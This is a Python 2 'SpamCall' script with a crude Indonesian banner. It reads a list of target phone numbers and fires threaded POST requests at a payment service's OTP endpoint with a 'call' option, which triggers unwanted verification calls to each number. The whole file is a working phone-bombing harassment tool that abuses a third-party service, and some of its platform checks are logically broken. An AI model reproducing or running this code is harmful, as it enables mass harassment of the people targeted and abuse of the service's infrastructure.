#!/usr/bin/env python
import thread, sys, os, platform, random
from time import sleep
if 'unix' or 'linux' or 'linux2' in sys.platform:
    R = '\x1b[31m'
    B = '\x1b[34m'
    W = '\x1b[00m'
    Y = '\x1b[33m'
    X = '\x1b[36m'
    n = ''
    rand = (R, B, W, Y, X, n)
    P = random.choice(rand)
else:
    if 'win' or 'darwin' in sys.platform:
        R = ''
        B = ''
        W = ''
        Y = ''
        X = ''
        n = ''
        rand = (R, B, W, Y, X, n)
        P = random.choice(rand)
    else:
        R = ''
        B = ''
        W = ''
        Y = ''
        X = ''
        n = ''
        rand = (R, B, W, Y, X, n)
        P = random.choice(rand)

def clear():
    if 'unix' or 'linux' or 'linux2' in sys.platform:
        os.system('clear')
    else:
        if 'win' or 'darwin' in sys.platform:
            os.system('cls')
        else:
            os.system('clear')


def Bannerinf():
    print ''
    print ('{} ____  {}  ____').format(R, X)
    print ('{}/ ___| {} / ___|  {}| {}Author   : Kontol').format(R, X, Y, W)
    print ('{}\\___ \\ {}| |      {}| {}Code     : Ular').format(R, X, Y, W)
    print ('{} ___) |{}| |___   {}| {}Github   : github.com/afelfgie').format(R, X, Y, W)
    print ('{}|____/ {} \\____|  {}| {}telegram : t.me/afelfgie').format(R, X, Y, W)
    print (' {}* {}Spam{}Call {}*').format(R, R, X, X)
    print ''


try:
    import requests
except ImportError:
    clear()
    Bannerinf()
    print "      %s[%s!%s] %sCAN'T IMPORT MODULE \x1b[7mrequests%s%s\x1b[00m %s[%s!%s]\n\n" % (R, Y, R, W, n, R, R, Y, R)
    sys.exit()
else:

    def res():
        python = sys.executable
        os.execl(python, python, *sys.argv)
        curdir = os.getcwd()


    clear()
    Bannerinf()
    while True:
        try:
            file = raw_input('' + R + '[' + B + '+' + R + '] ' + W + 'List Nomor Target' + R + ': ' + W + '')
            numbers = open(file, 'r').readlines()
            count = 0
            processc = 0
            running_threads = 0
            print_used = False
            max_threads = 100
        except IOError as e:
            print ('\n{}[{}!{}] {}KONTOL: {}{}').format(R, Y, R, R, W, e)
            sleep(1)
            clear()
            res()
        except KeyboardInterrupt:
            print ('\n{}[{}!{}] {}ERROR: {}Kontol Interrupt ...\n').format(R, Y, R, R, W)
            sys.exit()
        except EOFError:
            print ('\n\n{}[{}!{}] {}ERROR: {}Memek Interrupt ...\n').format(R, Y, R, R, W)
            sys.exit()
        else:
            print '' + R + '[' + B + '+' + R + '] ' + W + ('read {} numbers from {}').format(len(numbers), file)
            sleep(2)

            def process(number):
                global print_used
                global processc
                global running_threads
                running_threads += 1
                number = number.rstrip()
                url = 'https://www.tokocash.com/oauth/otp'
                data = {'msisdn': number.rstrip(), 'accept': 'call'}
                headers = {'X-Requested-With': 'XMLHttpRequest'}
                r = requests.post(url, data=data, headers=headers)
                while print_used:
                    pass

                print_used = True
                print '\r' + R + '[' + B + '+' + R + '] ' + W + '[0x' + str(thread.get_ident()) + ']: ' + number + ' (status: ' + r.json()['code'] + ')'
                print_used = False
                processc += 1
                running_threads -= 1
                return 1


            for number in numbers:
                while running_threads >= max_threads:
                    pass

                if number == '' or number[0] == ';':
                    continue
                count += 1
                thread.start_new_thread(process, (number,))

            while processc != count:
                pass

            print ''
            print '' + R + '[' + B + '+' + R + '] ' + W + 'Success Send Semua Ke No List'
            sys.exit()
